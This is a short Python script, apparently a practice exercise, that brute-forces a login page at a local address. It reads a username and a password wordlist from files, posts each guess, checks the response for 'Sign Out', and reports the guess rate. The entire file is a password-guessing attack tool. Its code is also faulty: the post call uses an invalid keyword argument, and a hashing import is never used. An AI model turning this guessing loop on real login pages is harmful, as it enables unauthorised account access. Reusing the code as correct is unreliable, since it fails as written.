import requests as req
from hashlib import sha256 as sha
import sys as s
import time as t


try:
	s.argv[1]
	s.argv[2]
except IndexError:
	print ("Give correct inputs")
	exit(0)

with open(s.argv[1], 'r') as file:
	inp = file.read()
uName = inp.rstrip("\r\n")

with open(s.argv[2], encoding='utf-8', errors='ignore') as file:
	ls = file.read()

ls = ls.split("\n")

url = 'http://127.0.0.1:8000/login.html'

idd = 0
start = t.time()

for ele in ls:
	idd += 1
	with req.Session() as c:
		
		name = uName
		passwd = ele
		c.get(url)
		logindata = dict(uname = name, pword = passwd)
		c.post(url, inp = logindata)
		page = c.get('http://127.0.0.1:8000/login.html')
		if 'Sign Out' in str(page.content):
			print("Password : ", ele)
			break

full_time = t.time() - start
print("No. of Guess's per 1s : ", int(idd/full_time))

